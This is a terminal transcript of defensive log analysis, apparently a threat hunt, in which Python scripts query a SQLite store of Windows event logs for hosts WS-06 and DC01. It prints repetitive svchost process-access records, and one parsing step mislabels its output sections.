-ID: evt-00227 | Code: 13 | Time: 2026-05-06T00:00:14.117Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x397e6787)
-ID: evt-00498 | Code: 13 | Time: 2026-05-06T00:00:30.274Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x4307d38d)
-ID: evt-00585 | Code: 12 | Time: 2026-05-06T00:00:42.363Z | User:  | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00586 | Code: 5158 | Time: 2026-05-06T00:00:42.363Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00605 | Code: 5158 | Time: 2026-05-06T00:00:43.363Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00606 | Code: 5158 | Time: 2026-05-06T00:00:43.363Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00607 | Code: 11 | Time: 2026-05-06T00:00:43.364Z | User:  | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00608 | Code: 3 | Time: 2026-05-06T00:00:44.371Z | User: NT AUTHORITY\NETWORK SERVICE | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00619 | Code: 3 | Time: 2026-05-06T00:00:46.371Z | User: NT AUTHORITY\NETWORK SERVICE | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00620 | Code: 3 | Time: 2026-05-06T00:00:46.371Z | User: NT AUTHORITY\NETWORK SERVICE | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00621 | Code: 13 | Time: 2026-05-06T00:00:46.371Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x4c912219)
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/details.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== ALL EVENTS ON WS-06 ===")
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, target_user, image, parent_image, command_line, target_image, target_object, details, message, dst_ip, dst_port, process_guid 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'WS-06.corp.example' 
-[?2004l[?2004h>     ORDER BY timestamp
-[?2004l[?2004h> """)
-[?2004l[?2004h> columns = [d[0] for d in cursor.description]
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     d = dict(zip(columns, r))
-[?2004l[?2004h>     print("-"*40)
-[?2004l[?2004h>     for k, v in d.items():
-[?2004l[?2004h>         if v is not None and v != '':
-[?2004l[?2004h>             print(f"{k}: {v}")
-[?2004l[?2004h> 
-[?2004l[?2004h> print("\n=== SUSPICIOUS EVENTS ON DC01 ===")
-[?2004l[?2004h> # Let's pull event codes 3, 10, 11, 12, 13, 18, 4697, 5140, 5145, etc. from DC01
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, target_user, image, parent_image, command_line, target_image, target_object, details, message, dst_ip, dst_port, process_guid 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'DC01.corp.example' 
-[?2004l[?2004h>       AND event_code IN (3, 5, 7, 9, 10, 11, 12, 13, 18, 5140, 5145, 4624, 4697) 
-[?2004l[?2004h>     ORDER BY timestamp
-[?2004l[?2004h> """)
-[?2004l[?2004h> columns = [d[0] for d in cursor.description]
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     d = dict(zip(columns, r))
-[?2004l[?2004h>     # Check if this event looks normal (e.g. standard machine accounts, common svchost paths, etc.)
-[?2004l[?2004h>     # Let's just print them all, and we can filter or look through
-[?2004l[?2004h>     print("-"*40)
-[?2004l[?2004h>     for k, v in d.items():
-[?2004l[?2004h>         if v is not None and v != '':
-[?2004l[?2004h>             # truncate long fields unless it's registry value
-[?2004l[?2004h>             val = str(v)
-[?2004l[?2004h>             if len(val) > 200 and k != 'details' and k != 'message':
-[?2004l[?2004h>                 val = val[:200] + "..."
-[?2004l[?2004h>             print(f"{k}: {val}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/details.py > /tmp/details.out
-[?2004l[?2004hroot@330dbb2b3463:~# head -n 200 /tmp/details.out
-[?2004l=== ALL EVENTS ON WS-06 ===
-----------------------------------------
-event_id: evt-00196
-event_code: 10
-timestamp: 2026-05-06T00:00:13.115Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+10225|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00198
-event_code: 10
-timestamp: 2026-05-06T00:00:13.116Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+108a0|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00200
-event_code: 10
-timestamp: 2026-05-06T00:00:13.117Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+106fe|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00202
-event_code: 10
-timestamp: 2026-05-06T00:00:13.117Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f6ba|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00205
-event_code: 10
-timestamp: 2026-05-06T00:00:13.118Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f97f|c:\windows\system32\lsm.dll+f7ad|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00207
-event_code: 10
-timestamp: 2026-05-06T00:00:13.119Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f6ba|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00208
-event_code: 10
-timestamp: 2026-05-06T00:00:13.119Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f97f|c:\windows\system32\lsm.dll+f7ad|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00210
-event_code: 10
-timestamp: 2026-05-06T00:00:13.120Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00212
-event_code: 10
-timestamp: 2026-05-06T00:00:13.120Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-9967-5f14-1600-000000000400}
-TargetProcessId: 1048
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x40
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|c:\windows\system32\lsm.dll+1a207|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+38289|C:\windows\System32\combase.dll+9e2bf|C:\windows\System32\combase.dll+154c3|C:\windows\System32\combase.dll+152b3|C:\windows\System32\combase.dll+a1166|C:\windows\System32\combase.dll+3c3fa|C:\windows\System32\combase.dll+9cdad|C:\windows\System32\combase.dll+52acc|C:\windows\System32\combase.dll+53331|C:\windows\System32\combase.dll+54ad8|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c470|C:\windows\System32\RPCRT4.dll+1a6bf|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00213
-event_code: 10
-timestamp: 2026-05-06T00:00:13.121Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00216
-event_code: 10
-timestamp: 2026-05-06T00:00:13.122Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/read_details.py
-[?2004l[?2004h> with open('/tmp/details.out') as f:
-[?2004l[?2004h>     content = f.read()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's search for events starting from evt-00220 onwards on WS-06
-[?2004l[?2004h> print("=== WS-06 AFTER EVT-00220 ===")
-[?2004l[?2004h> parts = content.split("===")
-[?2004l[?2004h> ws06_events = parts[1].split("----------------------------------------")
-[?2004l[?2004h> for ev in ws06_events:
-[?2004l[?2004h>     if "evt-0022" in ev or "evt-004" in ev or "evt-005" in ev or "evt-006" in ev:
-[?2004l[?2004h>         print("-"*40)
-[?2004l[?2004h>         print(ev.strip())
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== SUSPICIOUS DC01 EVENTS ===")
-[?2004l[?2004h> if len(parts) > 2:
-[?2004l[?2004h>     dc01_events = parts[2].split("----------------------------------------")
-[?2004l[?2004h>     print(f"Total DC01 events: {len(dc01_events)}")
-[?2004l[?2004h>     for ev in dc01_events:
-[?2004l[?2004h>         # Filter for non-standard or interesting ones
-[?2004l[?2004h>         # Let's filter out WEC$ user or DNS (event_code 3 and C:\Windows\System32\dns.exe)
-[?2004l[?2004h>         if "dns.exe" in ev or "WEC$" in ev or "evt-0000" in ev or "evt-0001" in ev or "evt-0003" in ev or "evt-0004" in ev or "evt-0005" in ev or "evt-0006" in ev:
-[?2004l[?2004h>             continue
-[?2004l[?2004h>         print("-"*40)
-[?2004l[?2004h>         print(ev.strip())
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/read_details.py
-[?2004l=== WS-06 AFTER EVT-00220 ===
-=== SUSPICIOUS DC01 EVENTS ===
-Total DC01 events: 27
-----------------------------------------
-
-----------------------------------------
-event_id: evt-00196
-event_code: 10
-timestamp: 2026-05-06T00:00:13.115Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+10225|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00198
-event_code: 10
-timestamp: 2026-05-06T00:00:13.116Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+108a0|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00200
-event_code: 10
-timestamp: 2026-05-06T00:00:13.117Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+106fe|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00202
-event_code: 10
-timestamp: 2026-05-06T00:00:13.117Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f6ba|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00205
-event_code: 10
-timestamp: 2026-05-06T00:00:13.118Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f97f|c:\windows\system32\lsm.dll+f7ad|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
